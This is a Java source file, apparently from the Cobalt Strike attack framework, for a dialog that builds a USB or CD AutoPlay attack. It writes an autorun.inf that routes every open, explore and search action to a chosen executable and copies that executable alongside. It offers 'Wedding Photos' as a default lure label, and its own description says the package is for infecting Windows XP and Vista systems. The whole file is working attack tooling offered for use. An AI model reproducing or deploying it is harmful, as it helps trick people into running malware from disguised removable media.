package aggressor.dialogs;

import aggressor.MultiFrame;
import common.CommonUtils;
import common.TeamQueue;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;

import java.awt.event.ActionEvent;
import java.io.File;
import java.io.IOException;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class AutoRunDialog implements DialogListener, SafeDialogCallback {

    protected MultiFrame window;

    protected JFrame dialog = null;

    protected TeamQueue conn = null;

    protected Map options = null;

    public AutoRunDialog(MultiFrame paramMultiFrame, TeamQueue teamQueue) {
        this.window = paramMultiFrame;
        this.conn = teamQueue;
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        this.options = map;
        SafeDialogs.openFile("Save AutoPlay files to...", null, null, false, true, this);
    }

    public void dialogResult(String string) {
        String str = (new File(this.options.get("EXE") + "")).getName();
        File file = new File(string);
        file.mkdirs();
        file.mkdir();
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("[autorun]\n");
        stringBuffer.append("open=" + str + "\n");
        stringBuffer.append("action=" + this.options.get("Action") + "\n");
        stringBuffer.append("icon=" + this.options.get("Icon") + "\n");
        stringBuffer.append("label=" + this.options.get("Label") + "\n");
        stringBuffer.append("shell\\Open\\command=" + str + "\n");
        stringBuffer.append("shell\\Explore\\command=" + str + "\n");
        stringBuffer.append("shell\\Search...\\command=" + str + "\n");
        stringBuffer.append("shellexecute=" + str + "\n");
        stringBuffer.append("UseAutoPlay=1\n");
        CommonUtils.writeToFile(new File(file, "autorun.inf"), CommonUtils.toBytes(stringBuffer.toString()));
        CommonUtils.copyFile(this.options.get("EXE") + "", new File(string, str));
        DialogUtils.showInfo("Created autorun.inf in " + string + ".\nCopy files to root of USB drive or burn to CD.");
    }

    public void show() throws IOException {
        this.dialog = DialogUtils.dialog("USB/CD AutoPlay", 640, 480);
        DialogManager dialogManager = new DialogManager(this.dialog);
        dialogManager.addDialogListener(this);
        dialogManager.set("Action", "Open folder to view files");
        dialogManager.set("Label", "Wedding Photos");
        dialogManager.set("Icon", "%systemroot%\\system32\\shell32.dll,4");
        dialogManager.text("Label", "Media Label:", 20);
        dialogManager.text("Action", "AutoPlay Action:", 20);
        dialogManager.text("Icon", "AutoPlay Icon:", 20);
        dialogManager.file("EXE", "Executable:");
        JButton jButton1 = dialogManager.action("Launch");
        JButton jButton2 = dialogManager.help("https://www.cobaltstrike.com/help-usb-autoplay-attack");
        this.dialog.add(DialogUtils.description("This package generates an autorun.inf that abuses the AutoPlay feature on Windows. Use this package to infect Windows XP and Vista systems through CDs and USB sticks."), "North");
        this.dialog.add(dialogManager.layout(), "Center");
        this.dialog.add(DialogUtils.center(jButton1, jButton2), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}
